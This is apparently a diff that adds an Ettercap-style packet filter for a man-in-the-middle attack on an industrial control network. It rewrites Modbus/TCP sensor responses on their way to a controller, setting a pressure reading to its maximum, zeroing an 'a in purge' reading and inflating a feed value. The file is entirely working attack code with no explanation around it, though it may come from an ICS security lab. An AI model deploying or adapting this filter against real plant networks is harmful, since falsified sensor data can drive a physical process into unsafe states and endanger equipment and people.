@@ -1,0 +1,28 @@
+# manipulate pressure reading to 65535
+# manipulate a in purge reading to 0
+# increase feed 1 by 10% of sensor range
+
+# feed 1
+if (ip.src == '192.168.95.10' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        if (DATA.data + 11 <= 0xdf) {
+            DATA.data + 11 += 0x20;
+        }
+    }
+}
+
+# pressure
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0xff;
+        DATA.data + 10 = 0xff;
+    }
+}
+
+# a in purge
+if (ip.src == '192.168.95.15' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0x00;
+        DATA.data + 10 = 0x00;
+    }
+}
